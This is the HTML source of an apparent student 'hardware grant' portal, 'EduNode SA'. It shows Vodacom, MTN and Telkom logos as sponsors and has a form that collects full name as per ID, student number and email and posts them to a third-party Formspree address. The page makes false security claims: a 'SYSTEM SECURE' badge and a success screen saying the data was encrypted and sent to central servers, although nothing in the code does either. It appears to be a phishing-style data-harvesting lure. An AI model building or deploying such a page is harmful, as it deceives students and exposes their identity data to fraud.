<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EduNode SA | Official Student Portal</title>
    <style>
        /* --- THE TECHY "LAMP" GLOW EFFECT --- */
        :root {
            --neon-blue: #00d2ff;
            --sa-gold: #ffb81c;
            --deep-space: #0f172a;
        }

        body {
            background-color: var(--deep-space);
            /* This radial gradient creates the "Lamp" glow behind the form */
            background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
            color: white;
            font-family: 'Inter', sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Sponsor Section */
        .sponsors {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            padding: 15px 0;
            display: flex;
            justify-content: center;
            gap: 40px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .sponsors img {
            height: 30px;
            filter: grayscale(1) brightness(1.5);
            opacity: 0.7;
        }

        .main-layout {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 50px;
            padding: 60px 20px;
            max-width: 1200px;
            width: 100%;
        }

        /* Laptop Images around the page */
        .side-laptop {
            flex: 1;
            max-width: 300px;
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        @media (max-width: 1000px) {
            .side-laptop { display: none; }
        }

        .side-laptop img {
            width: 100%;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
            transition: transform 0.5s;
        }

        .side-laptop img:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(0, 210, 255, 0.4);
        }

        /* The Main Application Card */
        .app-card {
            flex: 2;
            max-width: 450px;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            text-align: center;
        }

        h1 {
            font-size: 32px;
            background: linear-gradient(to right, #fff, var(--neon-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }

        .status-badge {
            display: inline-block;
            padding: 5px 15px;
            background: rgba(34, 197, 94, 0.2);
            color: #22c55e;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 30px;
        }

        /* Form Inputs */
        .input-wrap {
            text-align: left;
            margin-bottom: 20px;
        }

        label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: var(--neon-blue);
            margin-bottom: 8px;
            display: block;
        }

        input {
            width: 100%;
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            padding: 15px;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
            transition: 0.3s;
        }

        input:focus {
            outline: none;
            border-color: var(--neon-blue);
            box-shadow: 0 0 15px rgba(0, 210, 255, 0.2);
        }

        .glow-btn {
            width: 100%;
            background: var(--neon-blue);
            color: var(--deep-space);
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-weight: 800;
            font-size: 16px;
            cursor: pointer;
            transition: 0.4s;
            text-transform: uppercase;
            margin-top: 10px;
        }

        .glow-btn:hover {
            box-shadow: 0 0 25px rgba(0, 210, 255, 0.5);
            transform: translateY(-3px);
        }

        #success-screen {
            display: none;
            padding: 40px 0;
        }
    </style>
</head>
<body>

    <div class="sponsors">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Vodacom_Logo.svg/1200px-Vodacom_Logo.svg.png" alt="Vodacom">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/MTN_Logo.svg/1024px-MTN_Logo.svg.png" alt="MTN">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Telkom_logo.svg" alt="Telkom">
    </div>

    <div class="main-layout">
        <div class="side-laptop">
            <img src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853?w=500" alt="Hardware 1">
            <img src="https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=500" alt="Hardware 2">
        </div>

        <div class="app-card">
            <div id="form-ui">
                <h1>EDUNODE SA</h1>
                <div class="status-badge">SYSTEM SECURE • 2026 INTAKE</div>
                <p style="color: #94a3b8; font-size: 14px; margin-bottom: 30px;">Initialize your hardware grant request below.</p>

                <form action="https://formspree.io/f/mvzvopeg" method="POST" id="mainForm">
                    <div class="input-wrap">
                        <label>Identity Verification</label>
                        <input type="text" name="Full_Name" placeholder="Full Name as per ID" required>
                    </div>

                    <div class="input-wrap">
                        <label>Institutional ID</label>
                        <input type="text" name="Student_ID" placeholder="8-Digit Student Number" required>
                    </div>

                    <div class="input-wrap">
                        <label>Network Node (Email)</label>
                        <input type="email" name="Email" placeholder="name@university.ac.za" required>
                    </div>

                    <button type="submit" class="glow-btn">Initialize Auth</button>
                </form>
            </div>

            <div id="success-screen">
                <h2 style="color: #22c55e;">ACCESS GRANTED</h2>
                <p style="color: #94a3b8;">Data packet encrypted and transmitted to central servers. Verification required via email link.</p>
                <button class="glow-btn" style="background: #334155; color: white;" onclick="location.reload()">Reset Portal</button>
            </div>
        </div>

        <div class="side-laptop">
            <img src="https://images.unsplash.com/photo-1531297484001-80022131f5a1?w=500" alt="Hardware 3">
            <img src="https://images.unsplash.com/photo-1525547719571-a2d4ac8945e2?w=500" alt="Hardware 4">
        </div>
    </div>

    <script>
        const form = document.getElementById('mainForm');
        form.addEventListener('submit', function() {
            setTimeout(() => {
                document.getElementById('form-ui').style.display = 'none';
                document.getElementById('success-screen').style.display = 'block';
            }, 600);
        });
    </script>

</body>
</html>
